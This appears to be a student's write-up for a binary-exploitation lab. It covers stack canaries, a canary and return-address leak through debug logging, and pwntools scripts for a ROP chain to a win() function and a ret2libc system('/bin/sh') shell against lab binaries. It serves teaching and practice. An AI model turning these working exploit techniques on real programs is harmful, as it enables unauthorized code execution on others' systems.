# Q1 

The program has stack canaries enabled. 

# Q2

```bash
*** stack smashing detected ***: terminated
Aborted (core dumped)
```

# Q3

Look in the decompiled output for a lot of calls to a debug stdlogger, and then look in the main function for that logging function pointer to be set based on its logging level, in this case, if an environment variable LOG_LEVEL is set to DEBUG
```
export LOG_LEVEL=DEBUG
```

Copied from an output of the run, obviously these differ per run
``` bash
[2025-11-05 17:41:31.600] [main] [debug]   - 0x7ffd6fd59f60: (0x0000000000000000, 0x0000000000000000, 0x0000000000000000, 0x0000000000000000)
[2025-11-05 17:41:31.600] [main] [debug]   - 0x7ffd6fd59f80: (0x0000000000000000, 0x0000000000000000, 0x0000000000000000, 0x0000000000000000)
[2025-11-05 17:41:31.600] [main] [debug]   - 0x7ffd6fd59fa0: (0x0000000000000000, 0x0000000000000000, 0x0000000000000000, 0x0000000000000000)
[2025-11-05 17:41:31.600] [main] [debug]   - 0x7ffd6fd59fc0: (0x00007ffd00000000, 0x20806cd47d697100, 0x00007ffd6fd5a1a8, 0x0000000000000001)
[2025-11-05 17:41:31.600] [main] [debug]   - 0x7ffd6fd59fe0: (0x00007ffd6fd5a080, 0x00005a9bd6426a0f, 0x00007ffd6fd5a020, 0x00007ffd6fd5a1b8)
```

The 0x20 address is the stack canary, and I'm going to guess the 0x5a address is the return address (only thing pointing to text...). Technically, I could verify this by checking in binaryninja and confirming the rbp offset of the buffer that's zeroed out matches the number of addresses we see between the zeroed-out section and rbp (the address before 0x5a). 

I'm too lazy to write the actual exploit, but the basic pattern would be to run the program, enter a valid size > 2, enter something random, then enter just a newline for the next entry, get the debug output, parse to find the range of zeroed-out addresses, then look 2 addresses after the last zero for the stack canary, then on the next write, put the shellcode in the buffer, then nop-pad up until the stack canary's position (2 address after the buffer's size) with the stack canary, then nop up to the return address, which we'll replace with an address to the start of our buffer (this requires ASLR to be off, since we don't have an ASLR leak). 

# Q5 

The win address is at 0x401ab0.

# Q6

ff d0 c3

# Q7

On jumping to that address, we wouldn't be able to execute any code there! 

# Q8

The address is 0x00401014. 

# Q9

My favorite ropping tool was humiliated :(. Had to use rf instead. 
```python
from pwn import *

path = "./loose_link.bin"

e = ELF(path)
p = process(path)


offset = 104
payload = b'A' * offset
payload += p64(0x401512); # Big pop gadget
payload += b"\x00"*8*4
payload += p64(0x401eb3) # Pop rdi
payload += p64(0x7fffffffe518 + 8*8) # An address to our win() function, since its 8 addrs after our starting, it's at address 8*8 + starting
payload += p64(0x401e9a) # Call [rdi] which calls our win function
payload += p64(0x401ab0) # Our win function address on thes stack

p.sendline(payload)

p.interactive()

```

# Bonus

So we could have constructed a rop chain just from the binary, but since ASLR's off let's let libc do the heavy lifting. 
```python
from pwn import *

path = "./baller.bin"
e = ELF(path)
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

p = process(path)

# Grabbed from info proc mappings
libc.address = int("0x7ffff6bd7000", 16)
log.info(f"libc base: 0x{libc.address:x}")

pop_rdi = libc.address + 0x2a3e5
binsh = next(libc.search(b"/bin/sh\x00"))

# Grabbed from ghidra
offset = 0x50 + 8
payload = b'A' * offset
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(pop_rdi + 1) # Stack alignment!!!
payload += p64(libc.symbols['system'])

p.sendline(payload)
p.interactive()
```
